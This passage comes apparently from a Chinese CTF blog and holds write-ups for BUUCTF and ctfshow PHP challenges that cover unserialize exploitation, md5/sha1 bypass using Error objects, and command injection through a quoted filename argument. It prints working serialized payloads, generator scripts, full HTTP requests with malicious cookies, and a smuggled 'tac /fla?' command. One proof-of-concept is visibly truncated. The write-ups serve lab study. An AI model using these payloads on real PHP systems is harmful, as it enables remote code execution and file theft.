class="line"><span class="keyword">class</span> <span class="variable constant_">SYCLOVER</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function __wakeup()&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable">$this</span>-&gt;syc != <span class="variable">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="variable">$this</span>-&gt;syc) === md5(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="variable">$this</span>-&gt;syc)=== sha1(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               eval(<span class="variable">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               die(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="variable constant_">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>给了源码 那么最重要的就是这个等式成立</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover))</span><br></pre></td></tr></table></figure><p>一般我们可以通过传数组 就可以bypass 但是这道题目是在类中 所以这个方法就不能用了</p><p>因此这里用到了新知识点：<strong>md5()和sha1()可以对一个类进行hash，并且会触发这个类的 __toString 方法；且当eval()函数传入一个类对象时，也会触发这个类里的 __toString 方法。</strong>  </p><p>所以我们可以通过用含有<code>__toString</code>方法的内置类进行绕过，这里用的是Exception 和 Error （随便选一个哪个都可以）</p><p>他们有 __toString 方法，当类被当做字符串处理时，就会调用这个函数。  </p><p>一个简单的demo来理解 偷的</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="string">?p</span>hp</span><br><span class="line"><span class="variable">$a</span> = new <span class="title class_">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span> = new <span class="title class_">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">echo <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">echo <span class="variable">$b</span>;</span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里我们将类当作字符串进行输出就会调用我们内置类中单<code>__toString</code>魔术方法</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689246050444-e2bd3402-2a56-4bfb-a11a-4fc596dab0f3.png" alt="img"></p><p>所以 <code>$a!=$b</code>但是我们输出的内容确是相同的</p><p>注意这里我们将<code>$a = new Error(&quot;payload&quot;,1);$b = new Error(&quot;payload&quot;,2);</code>放在同一行了 因为输出的内容包含我们的行数 所以为了满足条件成立 就要放在同一行</p><p>接着看正则将我们单双引号括号都waf了 我们可以include 包含flag文件 然后flag文件可以通过取反的方式绕过</p><p>exp:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="string">?p</span>hp</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">class</span> <span class="variable constant_">SYCLOVER</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.urldecode(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = new <span class="variable constant_">SYCLOVER</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;syc = new <span class="title class_">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$a</span>-&gt;lover = new <span class="title class_">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);<span class="comment">#注意要在一行才行</span></span><br><span class="line">echo urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:<code>?great=O%3A8%3A%22SYCLOVER%22%3A2%3A%7Bs%3A3%3A%22syc%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22E%3A%5Ccode%5Ctest%5C1.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A10%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7Ds%3A5%3A%22lover%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A2%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22E%3A%5Ccode%5Ctest%5C1.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A10%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D%7D</code></p><p>说明：<code>?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;</code>为什么要在前面加<code>?&gt;</code></p><p>Exception 类与 Error 的 __toString 方法在eval()函数中输出的结果是不可能控的</p><p>因为输出的报错信息中，payload前面还有一段杂乱信息<code>Error: </code></p><p>就比如我们之前的那个demo</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689247105099-87f2d3e4-1a74-4363-a461-6001c373d7c0.png" alt="img"></p><p>进入eval()函数就会以这样的形式：<code>eval(&quot;...Error: &lt;?php payload ?&gt;&quot;)</code></p><p>所以我们要用sql注入的思想 <code>?&gt;</code> 来闭合一下</p><p><code>eval(&quot;...Error: ?&gt;&lt;?php payload ?&gt;&quot;)</code>，这样我们的恶意代码就可以顺利执行了。  </p><p>参考：<a href="https://johnfrod.top/ctf/2020-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98greatphp/">https://johnfrod.top/ctf/2020-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98greatphp/</a></p><h1 id="112、EasyBypass"><a href="#112、EasyBypass" class="headerlink" title="112、EasyBypass"></a>112、EasyBypass</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="string">?p</span>hp</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="variable constant_">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$comm1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;comm1&#x27;</span>];</span><br><span class="line"><span class="variable">$comm2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;comm2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;</span>, <span class="variable">$comm1</span>))</span><br><span class="line">    <span class="variable">$comm1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;</span>, <span class="variable">$comm2</span>))</span><br><span class="line">    <span class="variable">$comm2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;#flag in /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$comm1</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$comm1</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$comm2</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$comm2</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;file $comm1 $comm2&quot;</span>;</span><br><span class="line">system(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>给了源码 comm1没有过滤tac 因此我们就在这里构造</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689248080086-9b602508-dccd-4faa-91e1-1503e8ef5b58.png" alt="img"></p><p>这道题目最重要的就是利用闭合的思想</p><p><code>$cmd = &quot;file $comm1 $comm2&quot;;</code>这句就是我们闭合逃逸的最重要的一句</p><p>file需要一个文件 那么我们就给他的一个index.php然后用”;去闭合</p><p>也就是<code>$cmd = &quot;file index.php&quot;; $comm2&quot;;</code></p><p>再加上我们的恶意代码 构造<code>index.php&quot;;tac /fla?;&quot;</code></p><p>原式就会被我们构造成以下三段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cmd = &quot;file index.php&quot;;</span><br><span class="line">tac /fla?;</span><br><span class="line">&quot; $comm2&quot;;</span><br></pre></td></tr></table></figure><p>成功bypass</p><p>payload：<code>?comm1=index.php&quot;;tac /fla?;&quot;&amp;comm2=1</code></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-反序列化</title>
      <link href="/post/4fb535d6.html"/>
      <url>/post/4fb535d6.html</url>
      
        <content type="html"><![CDATA[<p>ctfshow-反序列化</p><span id="more"></span><h1 id="WEB-254"><a href="#WEB-254" class="headerlink" title="WEB-254"></a>WEB-254</h1><p>就是看懂代码就可以了，和反序列化没关系，让条件成立就给flag了</p><p>paylaod:<code>?username=xxxxxx&amp;password=xxxxxx</code></p><h1 id="WEB-255"><a href="#WEB-255" class="headerlink" title="WEB-255"></a>WEB-255</h1><p>通过cookie传参反序列化达到<code>$isVip=true;</code>即可</p><p>poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后请求如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /?username=xxxxxx&amp;password=xxxxxx HTTP/<span class="number">1.1</span></span><br><span class="line">Host: b1e5d003-<span class="number">80</span>d4-<span class="number">4</span>a98-b405-<span class="number">4</span>ce5b5c72282.challenge.ctf.show</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span></span><br><span class="line"><span class="comment">referer: http://b1e5d003-80d4-4a98-b405-4ce5b5c72282.challenge.ctf.show/</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br></pre></td></tr></table></figure><h1 id="WEB-256"><a href="#WEB-256" class="headerlink" title="WEB-256"></a>WEB-256</h1><p>在上一题基础上使得username与password不相等 通过反序列化实现即可</p><p>poc: 这里最好不要将值设为数字会打不通的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>请求包如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /?username=a&amp;password=xxxxxx HTTP/<span class="number">1.1</span></span><br><span class="line">Host: d4976ed7-<span class="number">1</span>dae-<span class="number">4590</span>-a624-a16d69c89609.challenge.ctf.show</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br></pre></td></tr></table></figure><h1 id="WEB-257"><a href="#WEB-257" class="headerlink" title="WEB-257"></a>WEB-257</h1><p>思路：<code>ctfShowUser类的__destruct()-&gt;backDoor的getInfo()</code></p><p>利用构造函数进行覆盖就行了 </p><p>poc如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&#x27;system(&quot;cat flag.php&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>请求包：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /?username=xxxxxx&amp;password=xxxxxx HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">7</span>aa30d0e-<span class="number">43</span>ad-<span class="number">4</span>b97-<span class="number">85</span>fe-c4c15056de6d.challenge.ctf.show</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%22cat+flag.php%22%29%3B%22%3B%7D%7D</span></span><br><span class="line"><span class="comment">referer: http://7aa30d0e-43ad-4b97-85fe-c4c15056de6d.challenge.ctf.show/</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br></pre></td></tr></table></figure><h1 id="WEB-258"><a href="#WEB-258" class="headerlink" title="WEB-258"></a>WEB-258</h1><p>多了一个正则匹配条件：<code>!preg_match(&#39;/[oc]:\d+:/i&#39;, $_COOKIE[&#39;user&#39;])</code></p><p>就是不能存在<code>o:数字</code>的形式</p><p>因为我们序列化对象后会出现这种情况</p><p>所以我只需要在<code>:</code>之后加上<code>+</code>即可 因为浏览器解析会把我们的加号解析为空格 就可以bypass了</p><p>poc和上到题目一样 就是自己手动添加两个<code>+</code>即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+11:&quot;ctfShowUser&quot;:4:&#123;s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;s:8:&quot;password&quot;;s:6:&quot;xxxxxx&quot;;s:5:&quot;isVip&quot;;b:1;s:5:&quot;class&quot;;O:+8:&quot;backDoor&quot;:1:&#123;s:4:&quot;code&quot;;s:23:&quot;system(&quot;cat flag.php&quot;);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>提交的时候再url编码一下不然会出现歧义</p><h1 id="WEB-259-SoapClient"><a href="#WEB-259-SoapClient" class="headerlink" title="WEB-259(SoapClient)"></a>WEB-259(SoapClient)</h1><p>SoapClient采用HTTP作为底层通讯协议，XML作为数据传送的格式。  </p><p>这道题目本质我看了一下wp 利用SoapClient的__call魔术方法 </p><p>因为我们用SoapClient生成的对象不存在<code>getFlag()</code>方法，所以就会自动调用__call魔术方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__call($func,$args)</span><br></pre></td></tr></table></figure><p>默认$func为不存在函数名 $args为参数 并且以数组形式  </p><p>这道题目最大问题就是没法直接通过访问&#x2F;flag修改其xff为127.0.0.1来达到条件</p><p>所以就需要这个内置类配合crlf来模拟一个请求包 来达到将flag存入flag.txt的条件</p><p>我的理解是这样</p><p>参考:<a href="https://www.xiinnn.com/article/7741c455.html">https://www.xiinnn.com/article/7741c455.html</a> 讲的很仔细</p><p>poc(偷的人家的):</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              <span class="meta">?&gt;</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">echo urlencode(serialize($a))</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="WEB-262，264-反序列化字符串逃逸"><a href="#WEB-262，264-反序列化字符串逃逸" class="headerlink" title="WEB-262，264(反序列化字符串逃逸)"></a>WEB-262，264(反序列化字符串逃逸)</h1><p>看到有序列化后字符替换 一眼丁真就是字符串逃逸</p><p>这道题目其实会将我们提交的内容先序列化然后再反序列化</p><p>简单demo看懂</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>=<span class="string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;<span class="comment"># </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">#echo $c;</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="variable">$b</span>)))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688540178216-b4b80ad8-03f9-4c4e-a980-5e28ab85395e.png" alt="img"></p><p>payload:<code>?f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck%22%3Bs%3A5%3A%22token%22%3Bs%3A5%3A%22admin%22%3B%7D</code></p><p>然后将cookie保存下来 访问&#x2F;message 打入cookie即可获得flag</p><h1 id="WEB-263-phpsession序列化"><a href="#WEB-263-phpsession序列化" class="headerlink" title="WEB-263(phpsession序列化)"></a>WEB-263(phpsession序列化)</h1><p>访问&#x2F;<a href="http://www.zip源码泄露/">www.zip源码泄露</a></p><p>这道题目一开始最大的疑惑是是我们提交上去的序列化内容在哪反序列化的</p><p>网上wp千篇一律没人提及</p><p>最后我也没弄明白 感觉只有这个session引擎会 所以我也就这么理解了</p><p>先来看：<code>ini_set(&#39;session.serialize_handler&#39;, 